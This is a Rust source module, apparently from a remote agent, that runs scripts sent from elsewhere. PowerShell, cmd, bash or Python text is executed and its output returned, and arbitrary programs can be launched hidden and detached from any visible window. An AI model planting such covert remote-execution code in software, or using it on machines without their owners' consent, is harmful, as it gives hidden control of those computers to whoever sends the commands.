use std::process::Stdio;
use std::time::Duration;

use crate::{
    commands::Ctx,
    protocol::{self, Obj},
};

pub async fn handle(ctx: Ctx) {
    match ctx.command.name.as_str() {
        "script_exec" => script_exec(ctx).await,
        "silent_exec" => silent_exec(ctx).await,
        _ => {
            ctx.out
                .result(&ctx.command, false, Some("unknown exec command"))
                .await;
        }
    }
}

async fn script_exec(ctx: Ctx) {
    let script = ctx.string("script").unwrap_or("").to_owned();
    let kind = ctx.string_or("type", "powershell").to_lowercase();
    let mut command = match kind.as_str() {
        "powershell" => {
            let mut command = tokio::process::Command::new("powershell.exe");
            command.args(["-NoProfile", "-NonInteractive", "-Command", &script]);
            command
        }
        "cmd" => {
            if !cfg!(windows) {
                ctx.out
                    .result(&ctx.command, false, Some("cmd is only supported on Windows"))
                    .await;
                return;
            }
            let mut command = tokio::process::Command::new("cmd.exe");
            command.args(["/C", &script]);
            command
        }
        "bash" | "sh" => {
            let mut command = tokio::process::Command::new(if kind == "bash" { "bash" } else { "sh" });
            command.args(["-c", &script]);
            command
        }
        "python" | "python3" => {
            let mut command = tokio::process::Command::new(&kind);
            command.args(["-c", &script]);
            command
        }
        _ => {
            ctx.out
                .result(&ctx.command, false, Some("unsupported script type"))
                .await;
            return;
        }
    };
    command.stdout(Stdio::piped()).stderr(Stdio::piped());
    #[cfg(windows)]
    {
        command.creation_flags(0x08000000);
    }
    let output = tokio::time::timeout(Duration::from_secs(300), command.output()).await;
    match output {
        Ok(Ok(output)) => {
            let mut text = String::from_utf8_lossy(&output.stdout).into_owned();
            let errors = String::from_utf8_lossy(&output.stderr);
            if !errors.is_empty() {
                if !text.is_empty() && !text.ends_with('\n') {
                    text.push('\n');
                }
                text.push_str(&errors);
            }
            ctx.out
                .send(
                    Obj::new()
                        .put(protocol::key_type(), protocol::s("script_result"))
                        .put(protocol::key_command_id(), protocol::s(&ctx.command.id))
                        .put(protocol::key_ok(), protocol::b(output.status.success()))
                        .put(protocol::key_output(), protocol::s(text.trim_end()))
                        .put(
                            protocol::key_error(),
                            protocol::owned(if output.status.success() {
                                String::new()
                            } else {
                                format!("exit status {}", output.status)
                            }),
                        )
                        .value(),
                )
                .await;
        }
        Ok(Err(error)) => {
            ctx.out
                .send(
                    Obj::new()
                        .put(protocol::key_type(), protocol::s("script_result"))
                        .put(protocol::key_command_id(), protocol::s(&ctx.command.id))
                        .put(protocol::key_ok(), protocol::b(false))
                        .put(protocol::key_output(), protocol::s(""))
                        .put(protocol::key_error(), protocol::s(&error.to_string()))
                        .value(),
                )
                .await;
        }
        Err(_) => {
            ctx.out
                .send(
                    Obj::new()
                        .put(protocol::key_type(), protocol::s("script_result"))
                        .put(protocol::key_command_id(), protocol::s(&ctx.command.id))
                        .put(protocol::key_ok(), protocol::b(false))
                        .put(protocol::key_output(), protocol::s(""))
                        .put(protocol::key_error(), protocol::s("script timed out"))
                        .value(),
                )
                .await;
        }
    }
}

fn split_arguments(input: &str) -> Vec<String> {
    let mut result = Vec::new();
    let mut current = String::new();
    let mut quoted = false;
    let mut quote = '\0';
    for character in input.chars() {
        if quoted {
            if character == quote {
                quoted = false;
            } else {
                current.push(character);
            }
        } else if character == '"' || character == '\'' {
            quoted = true;
            quote = character;
        } else if character.is_whitespace() {
            if !current.is_empty() {
                result.push(std::mem::take(&mut current));
            }
        } else {
            current.push(character);
        }
    }
    if !current.is_empty() {
        result.push(current);
    }
    result
}

async fn silent_exec(ctx: Ctx) {
    let mut command_line = ctx.string("command").unwrap_or("").trim().to_owned();
    if command_line.is_empty() {
        ctx.out
            .result(&ctx.command, false, Some("missing command"))
            .await;
        return;
    }
    if (command_line.starts_with('"') && command_line.ends_with('"') && command_line.len() > 1)
        || (command_line.starts_with('\'') && command_line.ends_with('\'') && command_line.len() > 1)
    {
        command_line = command_line[1..command_line.len() - 1].to_owned();
    }
    let arguments = ctx.string("args").unwrap_or("");
    let hide_window = ctx.boolean_or("hideWindow", true);
    let cwd = ctx.string("cwd").unwrap_or("").to_owned();
    let args = split_arguments(arguments);
    let result = tokio::task::spawn_blocking(move || {
        use std::process::Command;
        let mut command = Command::new(&command_line);
        command.args(&args);
        if !cwd.is_empty() {
            command.current_dir(&cwd);
        }
        #[cfg(windows)]
        {
            use std::os::windows::process::CommandExt;
            let mut flags = 0x08000000u32; // CREATE_NO_WINDOW
            if hide_window {
                flags |= 0x00000008; // DETACHED_PROCESS keeps the child independent
            }
            command.creation_flags(flags);
        }
        let _ = hide_window;
        command.spawn().map(|_| ()).map_err(|error| error.to_string())
    })
    .await;
    match result {
        Ok(Ok(())) => ctx.out.result(&ctx.command, true, None).await,
        Ok(Err(error)) => ctx.out.result(&ctx.command, false, Some(&error)).await,
        Err(error) => ctx.out.result(&ctx.command, false, Some(&error.to_string())).await,
    }
}
